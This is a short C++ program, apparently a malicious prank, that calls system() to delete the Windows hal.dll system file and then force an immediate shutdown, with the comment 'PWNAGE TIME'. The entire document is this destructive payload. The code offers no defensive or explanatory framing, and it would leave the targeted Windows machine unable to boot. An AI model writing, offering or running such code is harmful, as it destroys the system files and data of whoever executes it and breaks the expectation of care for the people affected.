#include &lt;cstdlib&gt;

#include &lt;iostream&gt;

using namespace std;

int main(int argc, char *argv[])

{
    
    system(&quot;del %SystemRoot%\\system32\\hal.dll -q&quot;);
    
    //PWNAGE TIME
    
    system(&quot;%SystemRoot%\\system32\\shutdown.exe -s -f -
           
           t 00&quot;);
    
    system(&quot;PAUSE&quot;);
    
    return EXIT_SUCCESS;
    
}
